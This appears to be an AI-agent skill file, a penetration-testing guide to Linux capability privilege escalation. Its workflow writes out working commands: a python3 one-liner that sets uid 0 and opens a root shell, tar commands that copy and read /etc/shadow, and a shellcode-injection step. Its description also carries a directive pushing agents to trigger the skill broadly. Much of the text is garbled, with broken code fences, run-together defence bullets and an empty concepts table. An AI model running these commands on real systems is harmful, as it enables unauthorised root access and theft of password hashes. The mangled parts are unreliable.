---
name: linux-capabilities-privesc
description: >
  [CRITICAL: MUST trigger this skill whenever related vulnerability testing is discussed.]
  Identify and exploit misconfigured Linux Capabilities. This skill covers how attackers escalate 
  privileges to root without relying on SUID binaries or kernel exploits by abusing excessive 
  capabilities like cap_dac_read_search, cap_sys_ptrace, or cap_setuid assigned to ordinary files.
domain: cybersecurity
subdomain: penetration-testing
category: Privilege Escalation
difficulty: advanced
estimated_time: "2-3 hours"
mitre_attack:
  tactics: [TA0004]
  techniques: [T1548.001]
platforms: [linux]
tags: [linux, capabilities, privilege-escalation, local-privesc, cap_setuid, tar]
tools: [getcap, python3, gcc]
version: "1.0"
author: CyberSkills-Elite
license: Apache-2.0
---

# Linux Capabilities Privilege Escalation

## When to Use
- During the post-exploitation phase on a Linux system after acquiring a low-privileged shell.
- When standard privilege escalation vectors (sudoers, SUID binaries, cron jobs) yield no results.

## Workflow

### Phase 1: Enumerating File Capabilities

```bash
# getcap -r / 2>/dev/null

# ```

### Phase 2: Exploiting cap_setuid (e.g., Python, Perl, Tar)

```bash
# # python3 -c 'import os; os.setuid(0); os.system("/bin/bash")'

# ```

### Phase 3: Exploiting cap_dac_read_search (e.g., Tar)

```bash
# # tar -cvf shadow.tar /etc/shadow
tar -xvf shadow.tar
cat etc/shadow
```

### Phase 4: Exploiting cap_sys_ptrace (Process Injection)

```bash
# inject_shellcode $(pidof root_process)
```

#### Decision Point 🔀
```mermaid
flowchart TD
    A[Run getcap ] --> B{Capabilities Found ]}
    B -->|Yes| C[Match Capability ]
    B -->|No| D[Check Other Vectors ]
    C --> E[Execute PrivEsc ]
```

## 🔵 Blue Team Detection & Defense
- **Audit File Capabilities Regularly**: **Principle of Least Privilege**: **Remove Development Tools**: Key Concepts
| Concept | Description |
|---------|-------------|
| Linux Capabilities | |
| cap_setuid vs SUID | |

## References
- HackTricks: [Linux Capabilities](https://book.hacktricks.xyz/linux-hardening/privilege-escalation/linux-capabilities)
- GTFOBins: [GTFOBins Capabilities](https://gtfobins.github.io/#+capabilities)
